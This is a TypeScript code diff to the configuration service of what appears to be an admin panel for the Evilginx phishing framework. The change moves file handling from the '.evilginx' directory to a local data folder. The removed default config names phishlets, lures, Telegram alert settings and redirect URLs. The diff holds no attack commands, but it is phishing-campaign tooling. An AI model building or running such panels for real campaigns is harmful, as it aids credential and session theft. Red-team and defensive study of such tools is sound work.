@@ -42,40 +42,30 @@ export class ConfigService {
   private dataDbPath: string;
   private blacklistWatcher: FSWatcher | null = null;
   private isInitialized: boolean = false;
-
-  // Get the absolute paths to the original .evilginx directory
-  private workspaceDir = path.resolve(process.cwd(), "../../..");
-  private evilginxDir = path.join(this.workspaceDir, ".evilginx");
-  private evilginxConfigPath: string;
-  private evilginxBlacklistPath: string;
-  private evilginxDataDbPath: string;
+  private dataDir: string;
 
   constructor() {
-    // Use only the local data directory, avoid accessing ~/.evilginx
-    const dataDir = path.resolve(process.cwd(), "data");
+    // Simply use the local data directory
+    this.dataDir = path.resolve(process.cwd(), "data");
 
     // Ensure data directory exists with proper permissions
     try {
-      fs.mkdirSync(dataDir, { recursive: true, mode: 0o755 });
+      fs.mkdirSync(this.dataDir, { recursive: true, mode: 0o755 });
     } catch (error) {
       console.error("Error creating data directory:", error);
       // Continue anyway, we'll handle file creation errors later
     }
 
-    // Set paths for local files only
-    this.configPath = path.join(dataDir, "config.json");
-    this.blacklistPath = path.join(dataDir, "blacklist.txt");
-    this.dataDbPath = path.join(dataDir, "data.db");
+    // Set paths for local files (including symlinks)
+    this.configPath = path.join(this.dataDir, "config.json");
+    this.blacklistPath = path.join(this.dataDir, "blacklist.txt");
+    this.dataDbPath = path.join(this.dataDir, "data.db");
 
-    // Original evilginx paths
-    this.evilginxConfigPath = path.join(this.evilginxDir, "config.json");
-    this.evilginxBlacklistPath = path.join(this.evilginxDir, "blacklist.txt");
-    this.evilginxDataDbPath = path.join(this.evilginxDir, "data.db");
-
-    console.log("Evilginx directory path:", this.evilginxDir);
-    console.log("Config paths:", {
-      panelDataPath: this.configPath,
-      evilginxPath: this.evilginxConfigPath,
+    console.log("Panel data directory:", this.dataDir);
+    console.log("Panel data paths:", {
+      configPath: this.configPath,
+      blacklistPath: this.blacklistPath,
+      dataDbPath: this.dataDbPath,
     });
 
     // Initialize files
@@ -89,14 +79,20 @@ export class ConfigService {
 
   private initializeFiles() {
     try {
-      // Create the default config if needed - ONLY if both local and evilginx files don't exist
-      this.ensureConfigExists();
+      // Check if required files exist - don't create them here
+      // as they should be created by the init_sync_watch.sh script
+      const configExists = fs.existsSync(this.configPath);
+      const blacklistExists = fs.existsSync(this.blacklistPath);
+      const dataDbExists = fs.existsSync(this.dataDbPath);
 
-      // Create an empty blacklist if needed
-      this.ensureBlacklistExists();
+      console.log("Panel data files status:", {
+        configExists,
+        blacklistExists,
+        dataDbExists,
+      });
 
-      // Create an empty data.db if needed
-      this.ensureDataDbExists();
+      // If files don't exist, they will be created by the init_sync_watch.sh script
+      // We'll simply mark as initialized to continue
 
       this.isInitialized = true;
       console.log("File initialization completed successfully");
@@ -104,115 +100,6 @@ export class ConfigService {
       console.error("Error initializing files:", error);
       // Do not throw - we'll try to continue with limited functionality
       this.isInitialized = false;
-    }
-  }
-
-  private ensureConfigExists() {
-    try {
-      // IMPORTANT: Never create or modify the config in the .evilginx directory
-      // Only create a default config if BOTH panel and evilginx configs don't exist
-
-      const evilginxConfigExists = fs.existsSync(this.evilginxConfigPath);
-      const panelConfigExists = fs.existsSync(this.configPath);
-
-      if (!evilginxConfigExists && !panelConfigExists) {
-        console.log(
-          "Both configs don't exist. Creating minimal default config."
-        );
-
-        // Create evilginx directory if it doesn't exist
-        if (!fs.existsSync(this.evilginxDir)) {
-          fs.mkdirSync(this.evilginxDir, { recursive: true, mode: 0o755 });
-        }
-
-        const defaultConfig: Config = {
-          blacklist: { mode: "unauth" },
-          general: {
-            telegram_bot_token: "",
-            telegram_chat_id: "",
-            autocert: true,
-            dns_port: 53,
-            https_port: 443,
-            bind_ipv4: "",
-            external_ipv4: "",
-            domain: "",
-            unauth_url: "https://example.com",
-          },
-          phishlets: {},
-          lures: [],
-        };
-
-        // Create config directly in .evilginx directory, not in panel/data
-        fs.writeFileSync(
-          this.evilginxConfigPath,
-          JSON.stringify(defaultConfig, null, 2),
-          { mode: 0o644 }
-        );
-        console.log(
-          "Created default config.json in .evilginx directory at:",
-          this.evilginxConfigPath
-        );
-      } else if (evilginxConfigExists && !panelConfigExists) {
-        console.log(
-          "Evilginx config exists but panel config doesn't - this is expected with symlinks"
-        );
-      } else if (!evilginxConfigExists && panelConfigExists) {
-        console.log(
-          "WARNING: Panel config exists but evilginx config doesn't exist!"
-        );
-      } else {
-        console.log("Both configs exist - no action needed");
-      }
-    } catch (error) {
-      console.error("Error ensuring config exists:", error);
-    }
-  }
-
-  private ensureBlacklistExists() {
-    try {
-      // Similar approach to config - only create if both don't exist
-      const evilginxBlacklistExists = fs.existsSync(this.evilginxBlacklistPath);
-      const panelBlacklistExists = fs.existsSync(this.blacklistPath);
-
-      if (!evilginxBlacklistExists && !panelBlacklistExists) {
-        // Create evilginx directory if it doesn't exist
-        if (!fs.existsSync(this.evilginxDir)) {
-          fs.mkdirSync(this.evilginxDir, { recursive: true, mode: 0o755 });
-        }
-
-        // Create the file directly in .evilginx directory
-        fs.writeFileSync(this.evilginxBlacklistPath, "", { mode: 0o644 });
-        console.log(
-          "Created empty blacklist.txt in .evilginx directory:",
-          this.evilginxBlacklistPath
-        );
-      }
-    } catch (error) {
-      console.error("Error ensuring blacklist exists:", error);
-    }
-  }
-
-  private ensureDataDbExists() {
-    try {
-      // Similar approach to other files
-      const evilginxDataDbExists = fs.existsSync(this.evilginxDataDbPath);
-      const panelDataDbExists = fs.existsSync(this.dataDbPath);
-
-      if (!evilginxDataDbExists && !panelDataDbExists) {
-        // Create evilginx directory if it doesn't exist
-        if (!fs.existsSync(this.evilginxDir)) {
-          fs.mkdirSync(this.evilginxDir, { recursive: true, mode: 0o755 });
-        }
-
-        // Just create an empty file - the database service will handle initialization
-        fs.writeFileSync(this.evilginxDataDbPath, "", { mode: 0o644 });
-        console.log(
-          "Created empty data.db in .evilginx directory:",
-          this.evilginxDataDbPath
-        );
-      }
-    } catch (error) {
-      console.error("Error ensuring data.db exists:", error);
     }
   }
 
@@ -266,18 +153,10 @@ export class ConfigService {
 
   public async readConfig(): Promise<Config | null> {
     try {
-      // First try reading from the main source of truth - the .evilginx directory
-      if (fs.existsSync(this.evilginxConfigPath)) {
-        const configData = fs.readFileSync(this.evilginxConfigPath, "utf8");
-        return JSON.parse(configData) as Config;
-      }
-
-      // If for some reason we can't access the .evilginx file, try the panel/data copy
       if (fs.existsSync(this.configPath)) {
         const configData = fs.readFileSync(this.configPath, "utf8");
         return JSON.parse(configData) as Config;
       }
-
       return null;
     } catch (error) {
       console.error("Error reading config:", error);
@@ -314,16 +193,10 @@ export class ConfigService {
 
   public async writeConfig(config: Config): Promise<boolean> {
     try {
-      // ALWAYS write to the original .evilginx file, not the panel/data symlink
+      // Write directly to the symlinked file in panel/data
       const configStr = JSON.stringify(config, null, 2);
-
-      // Make sure evilginx directory exists
-      if (!fs.existsSync(this.evilginxDir)) {
-        fs.mkdirSync(this.evilginxDir, { recursive: true, mode: 0o755 });
-      }
-
-      fs.writeFileSync(this.evilginxConfigPath, configStr, { mode: 0o644 });
-      console.log("Successfully wrote config to:", this.evilginxConfigPath);
+      fs.writeFileSync(this.configPath, configStr, { mode: 0o644 });
+      console.log("Successfully wrote config to:", this.configPath);
       return true;
     } catch (error) {
       console.error("Error writing config:", error);
